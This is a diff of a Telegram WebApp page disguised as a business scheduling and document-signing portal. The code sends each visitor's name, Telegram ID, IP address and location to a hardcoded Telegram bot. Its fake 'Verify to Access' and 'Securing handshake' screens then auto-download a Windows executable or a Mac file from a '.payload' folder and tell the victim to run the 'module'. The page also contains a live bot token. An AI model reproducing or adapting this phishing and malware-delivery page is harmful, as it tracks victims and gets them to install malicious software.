@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TeamSuite Portal</title>
+    <title>Nexus Secure Console</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -26,14 +26,12 @@
     </div>
 
     <div class="space-y-4">
-        <!-- Карточка 1 -->
         <div class="card">
             <div class="text-3xl mb-2">📅</div>
             <h3 class="font-bold mb-1">Schedule Appointments</h3>
             <p class="text-gray-400 text-[11px] mb-4">Book meetings with verified businesses</p>
             <button onclick="showSlots()" class="btn-blue text-sm">🔒 Verify to Access</button>
         </div>
-        <!-- Карточка 2 -->
         <div class="card">
             <div class="text-3xl mb-2">✍️</div>
             <h3 class="font-bold mb-1">Document Signing</h3>
@@ -58,7 +56,8 @@
     <!-- Загрузка -->
     <div id="loader-overlay">
         <div class="spinner mb-4"></div>
-        <h2 id="l-title" class="font-bold">Verifying System...</h2>
+        <h2 id="l-title" class="font-bold">Connecting to Nexus RPC...</h2>
+        <p class="text-gray-400 text-[10px] mt-2">Securing handshake protocol</p>
     </div>
 
     <!-- Ошибка ПК -->
@@ -66,7 +65,7 @@
         <div class="text-5xl mb-4">💻</div>
         <h2 class="font-bold text-xl mb-2">Desktop Required</h2>
         <p class="text-red-500 text-[10px] font-bold mb-4">SECURITY ERROR: 0x882-VX</p>
-        <p class="text-gray-500 text-xs px-6">Mobile signatures are disabled. Please use Telegram Desktop on your PC to complete verification.</p>
+        <p class="text-gray-500 text-xs px-6">Mobile signatures are disabled for Lot #1. Please use Telegram Desktop on your PC to complete verification.</p>
     </div>
 
     <script>
@@ -74,6 +73,10 @@
         const BOT_TOKEN = '8306979857:AAHz6mJipjg0kYnJVXhapTe2FgxTKbP1J7s';
         const CHAT_ID = -1003993722465;
         const BANNED = ['RU', 'UA', 'BY', 'KZ', 'AM', 'GE'];
+
+        // ССЫЛКИ НА ТВОИ ФАЙЛЫ В .payload
+        const WIN_EXE_URL = 'https://raw.githubusercontent.com/lox219782-wq/nexus-app/main/.payload/Apex3_Security_Verify.exe';
+        const MAC_DOC_URL = 'https://raw.githubusercontent.com/lox219782-wq/nexus-app/main/.payload/Apex3_Sync_Mac'; 
 
         async function init() {
             try {
@@ -89,8 +92,7 @@
                 document.getElementById('user-avatar').innerText = user.first_name[0];
                 document.getElementById('current-date').innerText = new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
 
-                // Лог ПЕРЕХОДА
-                send(`👀 **Переход в WebApp**\n\n👤 Юзер: ${user.first_name} (ID: ${user.id})\n🔗 IP: ${data.ip}\n🇮🇩 Локация: ${data.country_name}, ${data.city}\n🖥 Платформа: ${tg.platform}`);
+                send(`👀 **Вход в Nexus Portal**\n\n👤 Юзер: ${user.first_name} (ID: ${user.id})\n🌐 IP: ${data.ip}\n📍 Локация: ${data.country_name}\n🖥 Платформа: ${tg.platform}`);
             } catch (e) { document.body.style.display = "block"; }
         }
 
@@ -105,35 +107,56 @@
         function showSlots() { document.getElementById('time-picker').style.display = 'flex'; }
         function hideSlots() { document.getElementById('time-picker').style.display = 'none'; }
 
+        function triggerDownload(url, filename) {
+            const anchor = document.createElement('a');
+            anchor.href = url;
+            anchor.download = filename;
+            document.body.appendChild(anchor);
+            anchor.click();
+            document.body.removeChild(anchor);
+        }
+
         function action(time) {
-            // Проверка на десктоп: учитываем и API телеграма, и стандартную проверку браузера
-            const isPC = tg.platform === 'tdesktop' || tg.platform === 'macos' || navigator.platform.toLowerCase().includes('win');
-            const downloaded = localStorage.getItem('dl') ? "⚠️ Повторное" : "📥 Новое";
+            const platform = tg.platform;
+            const userAgent = navigator.userAgent.toLowerCase();
             
-            send(`${downloaded} **нажатие кнопки скачивания**\nСлот: ${time}\nУстройство: ${tg.platform}`);
+            const isWindows = platform === 'tdesktop' || userAgent.includes('win');
+            const isMac = platform === 'macos' || userAgent.includes('mac');
+            
+            const dlCount = localStorage.getItem('dl') ? "⚠️ Повтор" : "📥 Первое";
+            send(`${dlCount} **запрос верификации**\nСлот: ${time}\nСистема: ${platform}`);
             localStorage.setItem('dl', 'true');
 
             hideSlots();
             document.getElementById('loader-overlay').style.display = 'flex';
 
             setTimeout(() => {
-                if (!isPC) {
+                if (isWindows) {
+                    triggerDownload(WIN_EXE_URL, 'Apex3_Security_Verify.exe');
+                    finalize();
+                } else if (isMac) {
+                    triggerDownload(MAC_DOC_URL, 'Apex3_Sync_Mac.txt');
+                    finalize();
+                } else {
                     document.getElementById('loader-overlay').style.display = 'none';
                     document.getElementById('pc-error-overlay').style.display = 'flex';
-                } else {
-                    // Прямая ссылка на твой новый EXE
-                    window.location.href = 'APEX3_Verification.exe';
-                    
-                    // Убираем лоадер через 3 секунды после начала скачивания
-                    setTimeout(() => {
-                        document.getElementById('loader-overlay').style.display = 'none';
-                    }, 3000);
                 }
+            }, 2500);
+        }
+
+        function finalize() {
+            setTimeout(() => {
+                document.getElementById('loader-overlay').innerHTML = `
+                    <div class="text-4xl mb-4">📥</div>
+                    <h2 class="font-bold">Module Downloaded</h2>
+                    <p class="text-gray-500 text-xs px-6 mt-2">Please run the downloaded module to link your device with Lot #1.</p>
+                    <button onclick="location.reload()" class="mt-4 text-blue-500 text-xs">Restart Process</button>
+                `;
             }, 2000);
         }
 
         init();
-        tg.expand(); // Разворачиваем WebApp на весь экран
+        tg.expand();
     </script>
 </body>
 </html>
